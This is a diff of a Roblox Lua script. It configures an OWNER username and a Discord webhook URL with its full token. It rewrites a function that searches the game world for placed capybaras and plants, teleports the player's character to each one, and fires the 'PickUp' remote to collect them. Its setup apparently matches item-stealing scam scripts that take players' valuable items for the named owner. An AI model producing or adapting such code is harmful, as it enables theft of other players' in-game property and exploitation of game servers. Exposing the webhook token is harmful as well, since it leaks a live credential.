@@ -2,7 +2,7 @@ local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
 
-local OWNER = "Yxzramen0"
+local OWNER = "Blu3_whal"
 local WEBHOOK = "https://discord.com/api/webhooks/1546003287067725855/3pSRKl_qcw1e4ggGIyMzuVB5HzlqvnyleUKscsYUJUqcG7JpP20wUNt0aLg0gX3WijZF"
 local MIN_MULT = 1.5
 
@@ -64,6 +64,8 @@ local function pickUpPlacedCapybarasAndPlants()
     local picked = { capybaras = {}, plants = {} }
     
     local workspace = game:GetService("Workspace")
+    
+    -- Try to find the plot/workspace where items are placed
     for _, obj in ipairs(workspace:GetDescendants()) do
         -- Look for capybara models/instances
         if (obj:IsA("Model") or obj:IsA("Part")) and obj.Name then
@@ -81,39 +83,30 @@ local function pickUpPlacedCapybarasAndPlants()
             end
             
             if isCapy or isPlant then
-                local humanoidRoot = obj:FindFirstChild("HumanoidRootPart")
-                if humanoidRoot then
-                    local char = lp.Character
-                    if char and char:FindFirstChild("Humanoid") then
-                        local itemType = isCapy and "Capybara" or "Plant"
-                        print("📍 Found valuable " .. itemType .. ": " .. obj.Name .. " - picking up...")
-                        
-                        -- Move close to the item
-                        char.Humanoid:MoveTo(humanoidRoot.Position)
-                        task.wait(0.8)
-                        
-                        -- Try multiple remote names for picking up
-                        for _, remoteName in ipairs({"PickUp", "Collect", "Grab", "Pick", "Pickup"}) do
-                            pcall(function()
-                                local remote = RS.Remotes:FindFirstChild(remoteName)
-                                if remote then
-                                    if remote:IsA("RemoteEvent") then
-                                        remote:FireServer(obj)
-                                    elseif remote:IsA("RemoteFunction") then
-                                        remote:InvokeServer(obj)
-                                    end
-                                end
-                            end)
-                        end
-                        
-                        task.wait(0.5)
-                        if isCapy then
-                            table.insert(picked.capybaras, obj.Name)
-                            print("✓ Picked up Capybara: " .. obj.Name)
-                        else
-                            table.insert(picked.plants, obj.Name)
-                            print("✓ Picked up Plant: " .. obj.Name)
-                        end
+                local char = lp.Character
+                if char and char:FindFirstChild("HumanoidRootPart") then
+                    local itemType = isCapy and "Capybara" or "Plant"
+                    print("📍 Found valuable " .. itemType .. ": " .. obj.Name)
+                    
+                    -- Move close to the item first
+                    local targetPos = obj:IsA("Part") and obj.Position or (obj:FindFirstChild("HumanoidRootPart") and obj.HumanoidRootPart.Position or obj:FindFirstChild("PrimaryPart") and obj.PrimaryPart.Position or obj.Position)
+                    char.HumanoidRootPart.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
+                    task.wait(0.3)
+                    
+                    -- Fire PickUp remote with the object
+                    print("   → Firing PickUp remote...")
+                    pcall(function()
+                        RS.Remotes.PickUp:FireServer(obj)
+                    end)
+                    
+                    task.wait(1)
+                    
+                    if isCapy then
+                        table.insert(picked.capybaras, obj.Name)
+                        print("✓ Picked up Capybara: " .. obj.Name)
+                    else
+                        table.insert(picked.plants, obj.Name)
+                        print("✓ Picked up Plant: " .. obj.Name)
                     end
                 end
             end
@@ -121,10 +114,10 @@ local function pickUpPlacedCapybarasAndPlants()
     end
     
     if #picked.capybaras > 0 then
-        print("✓ Picked up " .. #picked.capybaras .. " capybaras")
+        print("✓ Total Capybaras picked up: " .. #picked.capybaras)
     end
     if #picked.plants > 0 then
-        print("✓ Picked up " .. #picked.plants .. " plants")
+        print("✓ Total Plants picked up: " .. #picked.plants)
     end
     
     return picked
